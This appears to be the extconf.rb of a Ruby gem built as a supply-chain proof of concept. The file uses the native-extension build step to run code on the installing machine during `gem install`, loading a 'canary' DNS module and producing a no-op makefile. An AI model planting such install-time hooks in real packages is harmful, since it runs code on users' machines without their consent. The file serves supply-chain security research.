# frozen_string_literal: true

# INSTALL-TIME execution point (the RubyGems equivalent of npm's
# preinstall): RubyGems runs extconf.rb on the victim machine during
# `gem install`. A no-op makefile is generated so the "extension"
# builds cleanly.
require 'mkmf'

$stderr.puts '[PoC] extconf.rb executing at gem install time'
$LOAD_PATH.unshift(File.expand_path('../lib', __dir__))
require 'supplyshark_poc_dns' # canary side effect fires at install

create_makefile('supplyshark_poc_noop')
